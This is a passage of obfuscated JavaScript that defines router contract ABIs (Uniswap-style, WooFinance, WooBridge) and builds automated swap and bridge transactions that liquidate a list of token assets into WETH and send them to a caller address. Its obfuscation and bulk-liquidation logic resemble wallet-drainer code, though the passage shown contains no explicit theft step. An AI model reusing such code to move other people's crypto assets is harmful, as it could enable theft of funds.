            type: 'uint256'
          };
          const _0x3cbef6 = {
            internalType: "uint256",
            name: "amountInMax",
            type: "uint256"
          };
          const _0x1d1f45 = {
            internalType: "address[]",
            name: 'path',
            type: "address[]"
          };
          const _0x55ef23 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x39b5a8 = {
            inputs: [_0x30b91d, _0x3cbef6, _0x1d1f45, _0x55ef23],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountIn",
              'type': "uint256"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x54784b = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x2aa606 = {
            internalType: "uint256",
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x2780bc = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x4dfb28 = {
            inputs: [_0x54784b, _0x2aa606, _0x2780bc],
            name: "sweepToken",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5ed858 = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x20dbee = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x1cc4ef = {
            inputs: [_0x5ed858, _0x20dbee],
            name: "sweepToken",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x133dfc = {
            internalType: "address",
            name: 'token',
            type: "address"
          };
          const _0x122e64 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x135cba = {
            internalType: 'uint256',
            name: "feeBips",
            type: 'uint256'
          };
          const _0x594fed = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x3d1874 = {
            inputs: [_0x133dfc, _0x122e64, _0x135cba, _0x594fed],
            name: "sweepTokenWithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x2ea514 = {
            internalType: "address",
            name: "token",
            type: "address"
          };
          const _0x45d947 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x1298b = {
            internalType: "address",
            name: "recipient",
            type: 'address'
          };
          const _0x471385 = {
            internalType: 'uint256',
            name: "feeBips",
            type: 'uint256'
          };
          const _0x5571b8 = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x744642 = {
            inputs: [_0x2ea514, _0x45d947, _0x1298b, _0x471385, _0x5571b8],
            name: "sweepTokenWithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x465c13 = {
            internalType: "int256",
            name: "amount0Delta",
            type: "int256"
          };
          const _0x204b49 = {
            internalType: "int256",
            name: "amount1Delta",
            type: "int256"
          };
          const _0x2aff38 = {
            internalType: "bytes",
            name: "_data",
            type: 'bytes'
          };
          const _0xd90f5b = {
            inputs: [_0x465c13, _0x204b49, _0x2aff38],
            name: "uniswapV3SwapCallback",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x770304 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x1ac85e = {
            internalType: "address",
            name: 'recipient',
            type: "address"
          };
          const _0x3798c2 = {
            inputs: [_0x770304, _0x1ac85e],
            name: "unwrapWETH9",
            outputs: [],
            stateMutability: "payable",
            type: 'function'
          };
          const _0xa506da = {
            internalType: "uint256",
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x286624 = {
            inputs: [_0xa506da],
            name: "unwrapWETH9",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xa864d6 = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x52f6fa = {
            internalType: 'address',
            name: 'recipient',
            type: "address"
          };
          const _0x19a61f = {
            internalType: 'uint256',
            name: "feeBips",
            type: 'uint256'
          };
          const _0x2627d7 = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x2e97ba = {
            inputs: [_0xa864d6, _0x52f6fa, _0x19a61f, _0x2627d7],
            name: "unwrapWETH9WithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x6d345d = {
            internalType: 'uint256',
            name: "amountMinimum",
            type: 'uint256'
          };
          const _0x35d033 = {
            internalType: 'uint256',
            name: "feeBips",
            type: 'uint256'
          };
          const _0x5c2b4e = {
            internalType: "address",
            name: "feeRecipient",
            type: "address"
          };
          const _0x5266c9 = {
            inputs: [_0x6d345d, _0x35d033, _0x5c2b4e],
            name: "unwrapWETH9WithFee",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0xe87d2e = {
            internalType: 'uint256',
            name: "value",
            type: 'uint256'
          };
          const _0x341fd5 = {
            inputs: [_0xe87d2e],
            name: "wrapETH",
            outputs: [],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3a1bf0 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x5ed6e8 = [_0x229efc, _0x1444dc, _0x4dcfdd, _0x2feb14, _0x408ad0, _0x5a761f, _0x39110d, _0x3455b9, _0x1e178e, _0x12bc8a, _0x1211fa, _0x2e1592, _0x5d0bc1, _0x1af2f2, _0x5dd94f, _0x58d855, _0x15e893, _0x25b78f, _0x106ce3, _0x24f80f, _0x9567d9, _0x35615e, _0x321247, _0x48dfc6, _0x153e89, _0x85504a, _0x5afe6d, _0x4bdfac, _0x36a94d, _0x39b5a8, _0x4dfb28, _0x1cc4ef, _0x3d1874, _0x744642, _0xd90f5b, _0x3798c2, _0x286624, _0x2e97ba, _0x5266c9, _0x341fd5, _0x3a1bf0];
          let _0x348f60 = new ethers.Contract(_0x3941f8, _0x5ed6e8, _0xab3127);
          let _0x1498ce = await _0x348f60.WETH9();
          let _0x5b0673 = _0x2a18aa.asset;
          let _0x1009a7 = [];
          for (let _0x4d38bb of _0x5b0673) {
            let _0x24f3d2 = [];
            _0x24f3d2[0] = _0x4d38bb.token;
            _0x24f3d2[1] = _0x1498ce;
            try {
              let _0x49bd02 = this.token_array.find(_0xa60845 => _0xa60845.token_address == _0x4d38bb.token && _0xa60845.chain == _0x2a18aa.chain);
              let _0x18835a = this.token_array.find(_0x285c12 => _0x285c12.token_address == 'native' && _0x285c12.chain == _0x2a18aa.chain);
              _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x49bd02.value) * Number(0.7) / Number(_0x18835a.price)).toString(), "ether"));
            } catch {}
            let _0x7fbaa = _0x348f60["interface"].encodeFunctionData("swapExactTokensForTokens", [_0x4d38bb.amount, _0xcd0737, _0x24f3d2, this.getCaller(_0x2a18aa)]);
            _0x1009a7.push(_0x7fbaa);
          }
          let _0x356ef7 = _0x348f60["interface"].encodeFunctionData("multicall(bytes[])", [_0x1009a7]);
          let _0x20478d = {
            'to': _0x3941f8,
            'from': await this.getWalletAddress(),
            'data': _0x356ef7
          };
          return [_0xab3127.sendTransaction(_0x20478d), _0x1498ce];
        }
      case "WooFinance":
        {
          const _0x226150 = {
            internalType: "address",
            name: "_weth",
            type: "address"
          };
          const _0x5dc8f3 = {
            internalType: "address",
            name: '_pool',
            type: "address"
          };
          const _0x1d10e0 = {
            inputs: [_0x226150, _0x5dc8f3],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x397486 = {
            indexed: true,
            internalType: "address",
            name: "previousOwner",
            type: "address"
          };
          const _0x3c246b = {
            indexed: true,
            internalType: "address",
            name: "newOwner",
            type: "address"
          };
          const _0x166bd1 = {
            anonymous: false,
            inputs: [_0x397486, _0x3c246b],
            name: "OwnershipTransferred",
            type: 'event'
          };
          const _0x4d85e0 = {
            indexed: false,
            internalType: 'address',
            name: "newPool",
            type: "address"
          };
          const _0x2c05bb = {
            anonymous: false,
            inputs: [_0x4d85e0],
            name: "WooPoolChanged",
            type: 'event'
          };
          const _0x48d622 = {
            indexed: false,
            internalType: "enum IWooRouterV2.SwapType",
            name: "swapType",
            type: "uint8"
          };
          const _0x24172f = {
            indexed: true,
            internalType: "address",
            name: "fromToken",
            type: "address"
          };
          const _0x58ac2d = {
            indexed: true,
            internalType: "address",
            name: 'toToken',
            type: "address"
          };
          const _0x1e6ca9 = {
            indexed: false,
            internalType: 'uint256',
            name: 'fromAmount',
            type: 'uint256'
          };
          const _0x2bce50 = {
            indexed: false,
            internalType: 'uint256',
            name: "toAmount",
            type: 'uint256'
          };
          const _0x500de2 = {
            indexed: false,
            internalType: "address",
            name: "from",
            type: "address"
          };
          const _0x17baf3 = {
            indexed: true,
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0xf2d76d = {
            indexed: false,
            internalType: "address",
            name: "rebateTo",
            type: "address"
          };
          const _0x33a985 = {
            anonymous: false,
            inputs: [_0x48d622, _0x24172f, _0x58ac2d, _0x1e6ca9, _0x2bce50, _0x500de2, _0x17baf3, _0xf2d76d],
            name: "WooRouterSwap",
            type: 'event'
          };
          const _0x4c8aa2 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x590faa = {
            inputs: [],
            name: "WETH",
            outputs: [_0x4c8aa2],
            stateMutability: "view",
            type: "function"
          };
          const _0x3cecd1 = {
            internalType: "address",
            name: "approveTarget",
            type: "address"
          };
          const _0x36276e = {
            internalType: "address",
            name: "swapTarget",
            type: "address"
          };
          const _0x529f5f = {
            internalType: "address",
            name: "fromToken",
            type: "address"
          };
          const _0x107707 = {
            internalType: "address",
            name: 'toToken',
            type: "address"
          };
          const _0xe01f94 = {
            internalType: 'uint256',
            name: 'fromAmount',
            type: 'uint256'
          };
          const _0x511ac0 = {
            internalType: "uint256",
            name: "minToAmount",
            type: 'uint256'
          };
          const _0x4045e6 = {
            internalType: "address payable",
            name: 'to',
            type: "address"
          };
          const _0x4e7256 = {
            internalType: "bytes",
            name: "data",
            type: "bytes"
          };
          const _0x50a348 = {
            inputs: [_0x3cecd1, _0x36276e, _0x529f5f, _0x107707, _0xe01f94, _0x511ac0, _0x4045e6, _0x4e7256],
            name: "externalSwap",
            outputs: [{
              'internalType': 'uint256',
              'name': "realToAmount",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x3b70bb = {
            internalType: "address",
            name: "stuckToken",
            type: "address"
          };
          const _0x5a18c0 = {
            inputs: [_0x3b70bb],
            name: "inCaseTokenGotStuck",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2fba20 = {
            internalType: "address",
            name: '',
            type: "address"
          };
          const _0x5dff17 = {
            inputs: [_0x2fba20],
            name: "isWhitelisted",
            outputs: [{
              'internalType': "bool",
              'name': '',
              'type': "bool"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x3c14f0 = {
            inputs: [],
            name: "owner",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2bb62f = {
            internalType: "address",
            name: "fromToken",
            type: "address"
          };
          const _0x2cdcd2 = {
            internalType: 'address',
            name: 'toToken',
            type: "address"
          };
          const _0x4ba7e8 = {
            internalType: "uint256",
            name: "fromAmount",
            type: 'uint256'
          };
          const _0x50c7bd = {
            internalType: "uint256",
            name: "toAmount",
            type: 'uint256'
          };
          const _0x287003 = {
            inputs: [_0x2bb62f, _0x2cdcd2, _0x4ba7e8],
            name: "querySwap",
            outputs: [_0x50c7bd],
            stateMutability: "view",
            type: "function"
          };
          const _0x301a30 = {
            inputs: [],
            name: "quoteToken",
            outputs: [{
              'internalType': "address",
              'name': '',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x4930c8 = {
            inputs: [],
            name: "renounceOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x35093e = {
            internalType: 'address',
            name: "newPool",
            type: "address"
          };
          const _0x50dbae = {
            inputs: [_0x35093e],
            name: "setPool",
            outputs: [],
            stateMutability: "nonpayable",
            type: 'function'
          };
          const _0x27085e = {
            internalType: "address",
            name: "target",
            type: "address"
          };
          const _0x369ce5 = {
            internalType: "bool",
            name: "whitelisted",
            type: "bool"
          };
          const _0x147be4 = {
            inputs: [_0x27085e, _0x369ce5],
            name: "setWhitelisted",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2201f8 = {
            internalType: "address",
            name: "fromToken",
            type: "address"
          };
          const _0x521630 = {
            internalType: "address",
            name: "toToken",
            type: "address"
          };
          const _0x4fb54b = {
            internalType: 'uint256',
            name: 'fromAmount',
            type: 'uint256'
          };
          const _0x59d440 = {
            internalType: 'uint256',
            name: "minToAmount",
            type: "uint256"
          };
          const _0x51789a = {
            internalType: "address payable",
            name: 'to',
            type: 'address'
          };
          const _0x4a3c41 = {
            internalType: 'address',
            name: "rebateTo",
            type: "address"
          };
          const _0x12f486 = {
            internalType: 'uint256',
            name: "realToAmount",
            type: 'uint256'
          };
          const _0x520117 = {
            inputs: [_0x2201f8, _0x521630, _0x4fb54b, _0x59d440, _0x51789a, _0x4a3c41],
            name: "swap",
            outputs: [_0x12f486],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5537c9 = {
            internalType: "address",
            name: "newOwner",
            type: "address"
          };
          const _0x2ec95f = {
            inputs: [_0x5537c9],
            name: "transferOwnership",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x511c91 = {
            internalType: "address",
            name: "fromToken",
            type: "address"
          };
          const _0x9254dd = {
            internalType: "address",
            name: 'toToken',
            type: "address"
          };
          const _0x41e730 = {
            internalType: 'uint256',
            name: 'fromAmount',
            type: 'uint256'
          };
          const _0x1ba6e0 = {
            inputs: [_0x511c91, _0x9254dd, _0x41e730],
            name: "tryQuerySwap",
            outputs: [{
              'internalType': 'uint256',
              'name': "toAmount",
              'type': "uint256"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x369dd5 = {
            internalType: "contract IWooPPV2",
            name: '',
            type: "address"
          };
          const _0x463940 = {
            inputs: [],
            name: "wooPool",
            outputs: [_0x369dd5],
            stateMutability: "view",
            type: "function"
          };
          const _0x360869 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x5367ca = [_0x1d10e0, _0x166bd1, _0x2c05bb, _0x33a985, _0x590faa, _0x50a348, _0x5a18c0, _0x5dff17, _0x3c14f0, _0x287003, _0x301a30, _0x4930c8, _0x50dbae, _0x147be4, _0x520117, _0x2ec95f, _0x1ba6e0, _0x463940, _0x360869];
          let _0x40b7fe = new ethers.Contract(_0x3941f8, _0x5367ca, _0xab3127);
          let _0x21798c = await _0x40b7fe.WETH();
          try {
            let _0x5c624f = this.token_array.find(_0x1280c7 => _0x1280c7.token_address == _0x2a18aa.asset.token && _0x1280c7.chain == _0x2a18aa.chain);
            let _0x485a60 = this.token_array.find(_0x34a61b => _0x34a61b.token_address == "native" && _0x34a61b.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x5c624f.value) * Number(0.7) / Number(_0x485a60.price)).toString(), 'ether'));
          } catch {}
          return [_0x40b7fe.swap(_0x2a18aa.asset.token, _0x21798c, _0x2a18aa.asset.amount, _0xcd0737, path, this.getCaller(_0x2a18aa), this.getCaller(_0x2a18aa)), _0x21798c];
        }
      case "WooBridge":
        {
          try {
            let _0x3e5401 = _0x2a18aa.chain;
            let _0x17387c = 101;
            let _0x4a8e97 = 110;
            console.log("checking path for woobridge");
            let _0xfbc633 = '';
            let _0x379113 = '';
            switch (_0x3e5401) {
              case 'bsc':
                {
                  _0x17387c = 102;
                  _0xfbc633 = "0x55d398326f99059ff775485246999027b3197955";
                  _0x379113 = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8";
                  break;
                }
              case 'avax':
                {
                  _0x17387c = 106;
                  _0xfbc633 = "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E";
                  _0x379113 = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8";
                  break;
                }
              case 'matic':
                {
                  _0x17387c = 109;
                  _0xfbc633 = "0x2791bca1f2de4661ed88a30c99a7a9449aa84174";
                  _0x379113 = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8";
                  break;
                }
              case "arb":
                {
                  _0x17387c = 110;
                  _0x4a8e97 = 111;
                  _0xfbc633 = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8";
                  _0x379113 = "0x7f5c764cbc14f9669b88837ca1490cca17c31607";
                  break;
                }
              case 'op':
                {
                  _0x17387c = 111;
                  _0xfbc633 = "0x7F5c764cBc14f9669B88837ca1490cCa17c31607";
                  _0x379113 = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8";
                  break;
                }
            }
            let _0x1233a7 = [_0x2a18aa.asset.token, _0xfbc633, _0x2a18aa.asset.amount, _0x2a18aa.asset.amount];
            let _0x17a6d4 = [_0x4a8e97, _0x379113, _0x379113, 0, 0];
            console.log(_0x1233a7);
            console.log(_0x17a6d4);
            console.log(_0x3941f8);
            const _0x17474c = {
              internalType: "address",
              name: "_weth",
              type: "address"
            };
            const _0x16eee9 = {
              internalType: 'address',
              name: "_wooRouter",
              type: "address"
            };
            const _0x24f846 = {
              internalType: "address",
              name: "_stargateRouter",
              type: "address"
            };
            const _0x36832f = {
              internalType: "uint16",
              name: "_sgChainIdLocal",
              type: "uint16"
            };
            const _0x24bec7 = {
              inputs: [_0x17474c, _0x16eee9, _0x24f846, _0x36832f],
              stateMutability: "nonpayable",
              type: "constructor"
            };
            const _0x5af519 = {
              indexed: true,
              internalType: "address",
              name: "previousOwner",
              type: "address"
            };
            const _0x37e44c = {
              indexed: true,
              internalType: "address",
              name: "newOwner",
              type: "address"
            };
            const _0xb5851a = {
              anonymous: false,
              inputs: [_0x5af519, _0x37e44c],
              name: "OwnershipTransferred",
              type: 'event'
            };
            const _0x22699d = {
              indexed: true,
              internalType: 'uint256',
              name: "refId",
              type: "uint256"
            };
            const _0x2327f4 = {
              indexed: true,
              internalType: "address",
              name: "sender",
              type: "address"
            };
            const _0x1ea268 = {
              indexed: true,
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x187413 = {
              indexed: false,
              internalType: "address",
              name: "bridgedToken",
              type: "address"
            };
            const _0x5573d5 = {
              indexed: false,
              internalType: 'uint256',
              name: "bridgedAmount",
              type: 'uint256'
            };
            const _0x3ffd1e = {
              indexed: false,
              internalType: "address",
              name: 'toToken',
              type: 'address'
            };
            const _0x5ad9b8 = {
              indexed: false,
              internalType: 'address',
              name: "realToToken",
              type: "address"
            };
            const _0x5c50fc = {
              indexed: false,
              internalType: 'uint256',
              name: "minToAmount",
              type: 'uint256'
            };
            const _0x175d6d = {
              indexed: false,
              internalType: 'uint256',
              name: "realToAmount",
              type: 'uint256'
            };
            const _0x3cd692 = {
              anonymous: false,
              inputs: [_0x22699d, _0x2327f4, _0x1ea268, _0x187413, _0x5573d5, _0x3ffd1e, _0x5ad9b8, _0x5c50fc, _0x175d6d],
              name: "WooCrossSwapOnDstChain",
              type: 'event'
            };
            const _0x1f45aa = {
              indexed: true,
              internalType: 'uint256',
              name: 'refId',
              type: 'uint256'
            };
            const _0x142021 = {
              indexed: true,
              internalType: "address",
              name: "sender",
              type: "address"
            };
            const _0xf4de39 = {
              indexed: true,
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x2f4300 = {
              indexed: false,
              internalType: "address",
              name: "fromToken",
              type: "address"
            };
            const _0x3b83fd = {
              indexed: false,
              internalType: 'uint256',
              name: 'fromAmount',
              type: 'uint256'
            };
            const _0xc725e6 = {
              indexed: false,
              internalType: "uint256",
              name: "minBridgeAmount",
              type: "uint256"
            };
            const _0x3fc589 = {
              indexed: false,
              internalType: 'uint256',
              name: "realBridgeAmount",
              type: 'uint256'
            };
            const _0x492632 = {
              anonymous: false,
              inputs: [_0x1f45aa, _0x142021, _0xf4de39, _0x2f4300, _0x3b83fd, _0xc725e6, _0x3fc589],
              name: "WooCrossSwapOnSrcChain",
              type: 'event'
            };
            const _0x13c809 = {
              inputs: [],
              name: "ETH_PLACEHOLDER_ADDR",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: 'function'
            };
            const _0x5e3ac0 = {
              internalType: "address",
              name: 'token',
              type: "address"
            };
            const _0x3500d9 = {
              inputs: [_0x5e3ac0],
              name: "addDirectBridgeToken",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x47b2 = {
              internalType: "address[]",
              name: '',
              type: "address[]"
            };
            const _0x211d8a = {
              inputs: [],
              name: "allDirectBridgeTokens",
              outputs: [_0x47b2],
              stateMutability: "view",
              type: 'function'
            };
            const _0x167f6e = {
              inputs: [],
              name: "allDirectBridgeTokensLength",
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x47aaea = {
              inputs: [],
              name: "bridgeSlippage",
              outputs: [{
                'internalType': 'uint256',
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: 'view',
              type: "function"
            };
            const _0x501633 = {
              internalType: "uint256",
              name: "refId",
              type: 'uint256'
            };
            const _0x542650 = {
              internalType: "address payable",
              name: 'to',
              type: "address"
            };
            const _0x371b2d = {
              internalType: "address",
              name: "fromToken",
              type: "address"
            };
            const _0x146f5a = {
              internalType: "address",
              name: "bridgeToken",
              type: "address"
            };
            const _0x1a043c = {
              internalType: 'uint256',
              name: "fromAmount",
              type: 'uint256'
            };
            const _0x14a403 = {
              internalType: 'uint256',
              name: "minBridgeAmount",
              type: 'uint256'
            };
            const _0x2b10d0 = {
              components: [_0x371b2d, _0x146f5a, _0x1a043c, _0x14a403],
              internalType: "struct IWooCrossChainRouterV2.SrcInfos",
              name: "srcInfos",
              type: "tuple"
            };
            const _0x132a5f = {
              internalType: "uint16",
              name: 'chainId',
              type: "uint16"
            };
            const _0x1f9139 = {
              internalType: "address",
              name: 'toToken',
              type: "address"
            };
            const _0x1dd6c1 = {
              internalType: "address",
              name: "bridgeToken",
              type: "address"
            };
            const _0x54f583 = {
              internalType: 'uint256',
              name: "minToAmount",
              type: 'uint256'
            };
            const _0x48c84e = {
              internalType: 'uint256',
              name: "airdropNativeAmount",
              type: 'uint256'
            };
            const _0x30b54b = {
              components: [_0x132a5f, _0x1f9139, _0x1dd6c1, _0x54f583, _0x48c84e],
              internalType: "struct IWooCrossChainRouterV2.DstInfos",
              name: "dstInfos",
              type: "tuple"
            };
            const _0x1bae8a = {
              inputs: [_0x501633, _0x542650, _0x2b10d0, _0x30b54b],
              name: "crossSwap",
              outputs: [],
              stateMutability: "payable",
              type: "function"
            };
            const _0x315a4c = {
              inputs: [],
              name: "dstGasForNoSwapCall",
              outputs: [{
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x304f79 = {
              inputs: [],
              name: "dstGasForSwapCall",
              outputs: [{
                'internalType': 'uint256',
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3c77dd = {
              internalType: "address",
              name: "stuckToken",
              type: "address"
            };
            const _0x161857 = {
              inputs: [_0x3c77dd],
              name: "inCaseTokenGotStuck",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x1d8b0e = {
              internalType: "uint16",
              name: "srcChainId",
              type: "uint16"
            };
            const _0x587cd1 = {
              internalType: "bytes",
              name: '',
              type: "bytes"
            };
            const _0x4dcf19 = {
              internalType: "uint64",
              name: '',
              type: 'uint64'
            };
            const _0x1f0a07 = {
              internalType: "bytes32",
              name: "from",
              type: "bytes32"
            };
            const _0x140905 = {
              internalType: 'uint256',
              name: 'amountLD',
              type: 'uint256'
            };
            const _0x4bc09c = {
              internalType: "bytes",
              name: "payload",
              type: "bytes"
            };
            const _0x47f7b0 = {
              inputs: [_0x1d8b0e, _0x587cd1, _0x4dcf19, _0x1f0a07, _0x140905, _0x4bc09c],
              name: "onOFTReceived",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x196db7 = {
              inputs: [],
              name: "owner",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x5e9237 = {
              internalType: 'uint256',
              name: "refId",
              type: "uint256"
            };
            const _0x54c811 = {
              internalType: "address",
              name: 'to',
              type: "address"
            };
            const _0x1cb1f6 = {
              internalType: "address",
              name: "fromToken",
              type: "address"
            };
            const _0x1d744c = {
              internalType: "address",
              name: "bridgeToken",
              type: "address"
            };
            const _0x58e787 = {
              internalType: 'uint256',
              name: 'fromAmount',
              type: 'uint256'
            };
            const _0x3b85ad = {
              internalType: 'uint256',
              name: "minBridgeAmount",
              type: 'uint256'
            };
            const _0x344923 = {
              components: [_0x1cb1f6, _0x1d744c, _0x58e787, _0x3b85ad],
              internalType: "struct IWooCrossChainRouterV2.SrcInfos",
              name: "srcInfos",
              type: "tuple"
            };
            const _0x4cff20 = {
              internalType: "uint16",
              name: 'chainId',
              type: "uint16"
            };
            const _0x1b365e = {
              internalType: "address",
              name: 'toToken',
              type: "address"
            };
            const _0x2c1b34 = {
              internalType: "address",
              name: "bridgeToken",
              type: "address"
            };
            const _0x237cf9 = {
              internalType: 'uint256',
              name: "minToAmount",
              type: 'uint256'
            };
            const _0x50b740 = {
              internalType: 'uint256',
              name: "airdropNativeAmount",
              type: 'uint256'
            };
            const _0x5d059d = {
              components: [_0x4cff20, _0x1b365e, _0x2c1b34, _0x237cf9, _0x50b740],
              internalType: "struct IWooCrossChainRouterV2.DstInfos",
              name: "dstInfos",
              type: "tuple"
            };
            const _0x41a24b = {
              internalType: "uint256",
              name: '',
              type: "uint256"
            };
            const _0x527d0f = {
              inputs: [_0x5e9237, _0x54c811, _0x344923, _0x5d059d],
              name: "quoteLayerZeroFee",
              outputs: [_0x41a24b, {
                'internalType': "uint256",
                'name': '',
                'type': 'uint256'
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x110d45 = {
              internalType: "address",
              name: 'token',
              type: "address"
            };
            const _0x290585 = {
              inputs: [_0x110d45],
              name: "removeDirectBridgeToken",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x2d9c5f = {
              inputs: [],
              name: "renounceOwnership",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x195395 = {
              internalType: 'uint256',
              name: "_bridgeSlippage",
              type: 'uint256'
            };
            const _0x321629 = {
              inputs: [_0x195395],
              name: "setBridgeSlippage",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x72110 = {
              internalType: 'uint256',
              name: "_dstGasForNoSwapCall",
              type: 'uint256'
            };
            const _0x343fc4 = {
              inputs: [_0x72110],
              name: "setDstGasForNoSwapCall",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x51fce8 = {
              internalType: "uint256",
              name: "_dstGasForSwapCall",
              type: 'uint256'
            };
            const _0x1ec6fb = {
              inputs: [_0x51fce8],
              name: "setDstGasForSwapCall",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x576339 = {
              internalType: "uint16",
              name: "_sgChainIdLocal",
              type: "uint16"
            };
            const _0x41d6fb = {
              inputs: [_0x576339],
              name: "setSgChainIdLocal",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x38c7ae = {
              internalType: "uint16",
              name: 'chainId',
              type: "uint16"
            };
            const _0x3030a1 = {
              internalType: "address",
              name: 'token',
              type: "address"
            };
            const _0x1fd42c = {
              inputs: [_0x38c7ae, _0x3030a1],
              name: "setSgETH",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x475937 = {
              internalType: "uint16",
              name: 'chainId',
              type: 'uint16'
            };
            const _0x52e640 = {
              internalType: "address",
              name: 'token',
              type: "address"
            };
            const _0x3b6d67 = {
              internalType: 'uint256',
              name: "poolId",
              type: "uint256"
            };
            const _0x230ed4 = {
              inputs: [_0x475937, _0x52e640, _0x3b6d67],
              name: "setSgPoolId",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x8ba2dd = {
              internalType: "address",
              name: "_stargateRouter",
              type: "address"
            };
            const _0x1dc28c = {
              inputs: [_0x8ba2dd],
              name: "setStargateRouter",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x34d534 = {
              internalType: "address",
              name: 'token',
              type: "address"
            };
            const _0x34b68a = {
              internalType: "address",
              name: 'oft',
              type: 'address'
            };
            const _0x3019b4 = {
              inputs: [_0x34d534, _0x34b68a],
              name: "setTokenToOFT",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x579daa = {
              internalType: "uint16",
              name: "chainId",
              type: 'uint16'
            };
            const _0x3216b1 = {
              internalType: "address",
              name: "wooCrossChainRouter",
              type: "address"
            };
            const _0x1aeec6 = {
              inputs: [_0x579daa, _0x3216b1],
              name: "setWooCrossChainRouter",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x36817c = {
              internalType: "address",
              name: "_wooRouter",
              type: 'address'
            };
            const _0x47483e = {
              inputs: [_0x36817c],
              name: "setWooRouter",
              outputs: [],
              stateMutability: "nonpayable",
              type: "function"
            };
            const _0x1e705b = {
              inputs: [],
              name: "sgChainIdLocal",
              outputs: [{
                'internalType': "uint16",
                'name': '',
                'type': "uint16"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0xf0135d = {
              internalType: "uint16",
              name: '',
              type: "uint16"
            };
            const _0x4bb8fd = {
              inputs: [_0xf0135d],
              name: "sgETHs",
              outputs: [{
                'internalType': "address",
                'name': '',
                'type': "address"
              }],
              stateMutability: "view",
              type: "function"
            };
            const _0x3b728c = {
              internalType: "uint16",
              name: '',
              type: "uint16"
            };
